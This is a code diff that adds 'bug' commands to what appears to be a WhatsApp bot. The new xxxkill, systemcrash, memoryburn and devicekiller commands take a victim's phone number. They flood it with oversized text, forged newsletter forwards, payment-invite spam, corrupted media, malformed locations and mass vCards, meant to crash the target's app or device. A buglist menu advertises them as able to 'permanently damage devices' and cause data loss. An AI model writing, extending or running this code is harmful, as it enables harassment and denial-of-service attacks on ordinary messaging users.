@@ -787,6 +787,367 @@ case 'xnuke': {
     }
     break;
 }
+                case 'xxxkill': {
+    try {
+        if (!isOwner(m.sender)) {
+            return reply('🚫 *OWNER ONLY*\n\nAccess Denied!');
+        }
+        
+        if (!text) return reply(`💀 *XXXKILL BUG*\n\n📝 Usage: ${prefix + command} number\n📋 Example: ${prefix + command} 919876543210\n\n⚠️ EXTREME BUG!`);
+        
+        const victim = text + "@s.whatsapp.net";
+        const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '💀 Deploying XXXKILL...' }, { quoted: m });
+        
+        // Phase 1: Newsletter spam with heavy payload
+        for (let i = 0; i < 100; i++) {
+            try {
+                await XeonBotInc.sendMessage(victim, {
+                    text: generateHeavyPayload(200000),
+                    contextInfo: {
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: '120363222395675670@newsletter',
+                            newsletterName: generateHeavyPayload(100000),
+                            serverMessageId: 999999999
+                        },
+                        externalAdReply: {
+                            title: generateHeavyPayload(50000),
+                            body: generateHeavyPayload(50000),
+                            mediaType: 1,
+                            renderLargerThumbnail: true,
+                            thumbnailUrl: 'https://example.com/image.jpg',
+                            sourceUrl: 'https://wa.me/' + text
+                        }
+                    }
+                }, { quoted: createBugQuoted() });
+            } catch (e) {
+                console.log('Phase 1 error:', e);
+            }
+        }
+        
+        // Phase 2: Payment invite spam
+        for (let i = 0; i < 50; i++) {
+            try {
+                await XeonBotInc.relayMessage(victim, {
+                    paymentInviteMessage: {
+                        serviceType: "FBPAY",
+                        expiryTimestamp: Date.now() + 999999999999
+                    }
+                }, {});
+            } catch (e) {
+                console.log('Phase 2 error:', e);
+            }
+        }
+        
+        // Phase 3: Corrupted media
+        for (let i = 0; i < 25; i++) {
+            try {
+                await XeonBotInc.sendMessage(victim, {
+                    image: createCorruptedBuffer(500000),
+                    caption: generateHeavyPayload(100000),
+                    contextInfo: {
+                        mentionedJid: [victim],
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: '120363144038483540@newsletter',
+                            newsletterName: generateHeavyPayload(100000),
+                            serverMessageId: 999999999
+                        }
+                    }
+                }, { quoted: createBugQuoted() });
+            } catch (e) {
+                console.log('Phase 3 error:', e);
+            }
+        }
+        
+        await XeonBotInc.sendMessage(m.chat, { 
+            text: `💀 *XXXKILL DEPLOYED*\n\n🎯 Target: ${victim}\n💥 Status: COMPLETE`,
+            edit: loadingMsg.key 
+        });
+        
+    } catch (error) {
+        console.error('XXXKILL error:', error);
+        await reply('❌ XXXKILL deployment failed');
+    }
+    break;
+}
+
+case 'systemcrash': {
+    try {
+        if (!isOwner(m.sender)) {
+            return reply('🚫 *OWNER ONLY*\n\nAccess Denied!');
+        }
+        
+        if (!text) return reply(`🔥 *SYSTEM CRASH*\n\n📝 Usage: ${prefix + command} number\n📋 Example: ${prefix + command} 919876543210`);
+        
+        const victim = text + "@s.whatsapp.net";
+        const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '🔥 Initiating System Crash...' }, { quoted: m });
+        
+        // Create system overload
+        const crashSequence = async () => {
+            // Memory overload attack
+            for (let i = 0; i < 75; i++) {
+                const heavyContext = {
+                    text: '🔥CRASH🔥'.repeat(150000),
+                    contextInfo: {
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: '120363222395675670@newsletter',
+                            newsletterName: '🔥'.repeat(200000),
+                            serverMessageId: 999999999
+                        },
+                        externalAdReply: {
+                            title: '🔥SYSTEM CRASH🔥'.repeat(25000),
+                            body: 'OVERLOAD'.repeat(25000),
+                            mediaType: 2,
+                            renderLargerThumbnail: true,
+                            thumbnailUrl: 'https://example.com/crash.jpg'
+                        },
+                        mentionedJid: Array(1000).fill(victim)
+                    }
+                };
+                
+                try {
+                    await XeonBotInc.sendMessage(victim, heavyContext, { quoted: createBugQuoted() });
+                } catch (e) {
+                    console.log('Crash sequence error:', e);
+                }
+            }
+            
+            // Location overload
+            for (let i = 0; i < 30; i++) {
+                try {
+                    await XeonBotInc.sendMessage(victim, {
+                        location: {
+                            degreesLatitude: 999.999999999999,
+                            degreesLongitude: -999.999999999999,
+                            name: '🔥CRASH🔥'.repeat(100000),
+                            address: 'SYSTEM OVERLOAD'.repeat(50000),
+                            jpegThumbnail: createCorruptedBuffer(300000)
+                        }
+                    }, { quoted: createBugQuoted() });
+                } catch (e) {
+                    console.log('Location crash error:', e);
+                }
+            }
+        };
+        
+        await crashSequence();
+        
+        await XeonBotInc.sendMessage(m.chat, { 
+            text: `🔥 *SYSTEM CRASH COMPLETE*\n\n🎯 Target: ${victim}\n💥 Status: OVERLOADED`,
+            edit: loadingMsg.key 
+        });
+        
+    } catch (error) {
+        console.error('System crash error:', error);
+        await reply('❌ System crash failed');
+    }
+    break;
+}
+
+case 'memoryburn': {
+    try {
+        if (!isOwner(m.sender)) {
+            return reply('🚫 *OWNER ONLY*\n\nAccess Denied!');
+        }
+        
+        if (!text) return reply(`🧠 *MEMORY BURN*\n\n📝 Usage: ${prefix + command} number\n📋 Example: ${prefix + command} 919876543210`);
+        
+        const victim = text + "@s.whatsapp.net";
+        const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '🧠 Burning Memory...' }, { quoted: m });
+        
+        // Memory exhaustion attack
+        for (let round = 0; round < 50; round++) {
+            try {
+                // Document memory burn
+                await XeonBotInc.sendMessage(victim, {
+                    document: createCorruptedBuffer(999999),
+                    fileName: '🧠MEMORY_BURN🧠'.repeat(10000) + '.exe',
+                    mimetype: 'application/octet-stream',
+                    caption: generateHeavyPayload(100000),
+                    contextInfo: {
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: '120363222395675670@newsletter',
+                            newsletterName: '🧠BURN🧠'.repeat(100000),
+                            serverMessageId: 999999999
+                        }
+                    }
+                }, { quoted: createBugQuoted() });
+                
+                // Video memory burn
+                await XeonBotInc.sendMessage(victim, {
+                    video: createCorruptedBuffer(999999),
+                    caption: '🧠MEMORY OVERLOAD🧠'.repeat(50000),
+                    mimetype: 'video/mp4',
+                    contextInfo: {
+                        mentionedJid: Array(500).fill(victim),
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: '120363144038483540@newsletter',
+                            newsletterName: generateHeavyPayload(100000),
+                            serverMessageId: 999999999
+                        }
+                    }
+                }, { quoted: createBugQuoted() });
+                
+                // Contact memory burn
+                const contacts = [];
+                for (let i = 0; i < 1000; i++) {
+                    contacts.push({
+                        displayName: '🧠BURN🧠'.repeat(1000),
+                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${'MEMORY_BURN'.repeat(1000)}\nFN:${'🧠'.repeat(5000)}\nitem1.TEL;waid=${text}:+${text}\nitem1.X-ABLabel:BURN\nEND:VCARD`
+                    });
+                }
+                
+                await XeonBotInc.sendMessage(victim, {
+                    contacts: {
+                        displayName: 'MEMORY_BURN'.repeat(10000),
+                        contacts: contacts
+                    }
+                }, { quoted: createBugQuoted() });
+                
+            } catch (e) {
+                console.log('Memory burn error:', e);
+            }
+        }
+        
+        await XeonBotInc.sendMessage(m.chat, { 
+            text: `🧠 *MEMORY BURN COMPLETE*\n\n🎯 Target: ${victim}\n🔥 Status: BURNED`,
+            edit: loadingMsg.key 
+        });
+        
+    } catch (error) {
+        console.error('Memory burn error:', error);
+        await reply('❌ Memory burn failed');
+    }
+    break;
+}
+
+case 'devicekiller': {
+    try {
+        if (!isOwner(m.sender)) {
+            return reply('🚫 *OWNER ONLY*\n\nAccess Denied!');
+        }
+        
+        if (!text) return reply(`⚡ *DEVICE KILLER*\n\n📝 Usage: ${prefix + command} number\n📋 Example: ${prefix + command} 919876543210\n\n💀 ULTIMATE BUG!`);
+        
+        const victim = text + "@s.whatsapp.net";
+        const loadingMsg = await XeonBotInc.sendMessage(m.chat, { text: '⚡ Activating Device Killer...' }, { quoted: m });
+        
+        // Ultimate device killing sequence
+        const killSequence = async () => {
+            // Phase 1: Rapid fire text bombs
+            const rapidFire = Array(200).fill().map(async (_, i) => {
+                try {
+                    return XeonBotInc.sendMessage(victim, {
+                        text: `⚡DEVICE_KILLER⚡${'💀'.repeat(100000)}`,
+                        contextInfo: {
+                            isForwarded: true,
+                            forwardedNewsletterMessageInfo: {
+                                newsletterJid: '120363222395675670@newsletter',
+                                newsletterName: '⚡KILLER⚡'.repeat(100000),
+                                serverMessageId: 999999999 + i
+                            },
+                            externalAdReply: {
+                                title: generateHeavyPayload(75000),
+                                body: generateHeavyPayload(75000),
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, { quoted: createBugQuoted() });
+                } catch (e) {
+                    console.log('Rapid fire error:', e);
+                }
+            });
+            
+            await Promise.allSettled(rapidFire);
+            
+            // Phase 2: Payment spam
+            for (let i = 0; i < 100; i++) {
+                try {
+                    await XeonBotInc.relayMessage(victim, {
+                        paymentInviteMessage: {
+                            serviceType: "FBPAY",
+                            expiryTimestamp: Date.now() + 999999999999
+                        }
+                    }, {});
+                } catch (e) {
+                    console.log('Payment spam error:', e);
+                }
+            }
+            
+            // Phase 3: Media overload
+            for (let i = 0; i < 50; i++) {
+                try {
+                    await XeonBotInc.sendMessage(victim, {
+                        image: createCorruptedBuffer(999999),
+                        caption: '⚡DEVICE KILLER⚡'.repeat(50000),
+                        contextInfo: {
+                            mentionedJid: Array(1000).fill(victim),
+                            isForwarded: true,
+                            forwardedNewsletterMessageInfo: {
+                                newsletterJid: '120363144038483540@newsletter',
+                                newsletterName: generateHeavyPayload(100000),
+                                serverMessageId: 999999999
+                            }
+                        }
+                    }, { quoted: createBugQuoted() });
+                } catch (e) {
+                    console.log('Media overload error:', e);
+                }
+            }
+        };
+        
+        await killSequence();
+        
+        await XeonBotInc.sendMessage(m.chat, { 
+            text: `⚡ *DEVICE KILLER DEPLOYED*\n\n🎯 Target: ${victim}\n💀 Status: TERMINATED`,
+            edit: loadingMsg.key 
+        });
+        
+    } catch (error) {
+        console.error('Device killer error:', error);
+        await reply('❌ Device killer failed');
+    }
+    break;
+}
+
+case 'buglist': {
+    try {
+        if (!isOwner(m.sender)) {
+            return reply('🚫 *OWNER ONLY*\n\nAccess Denied!');
+        }
+        
+        const bugMenu = `💀 *XEON BUG ARSENAL* 💀\n\n` +
+                       `👤 *Owner:* 263777124998\n` +
+                       `🤖 *Bot:* ${botname}\n\n` +
+                       `🔥 *AVAILABLE BUGS:*\n\n` +
+                       `💀 ${prefix}xxxkill number\n` +
+                       `   └ Ultimate kill bug\n\n` +
+                       `🔥 ${prefix}systemcrash number\n` +
+                       `   └ System overload attack\n\n` +
+                       `🧠 ${prefix}memoryburn number\n` +
+                       `   └ Memory exhaustion bug\n\n` +
+                       `⚡ ${prefix}devicekiller number\n` +
+                       `   └ Ultimate device killer\n\n` +
+                       `⚠️ *EXTREME WARNING:*\n` +
+                       `• Can permanently damage devices\n` +
+                       `• May cause data loss\n` +
+                       `• Use only for testing\n` +
+                       `• Owner fully responsible\n\n` +
+                       `💀 *USE AT YOUR OWN RISK* 💀`;
+        
+        await reply(bugMenu);
+    } catch (error) {
+        console.error('Bug list error:', error);
+        await reply('❌ Menu error');
+    }
+    break;
+}
+
 
 case 'bugmenu': {
     try {
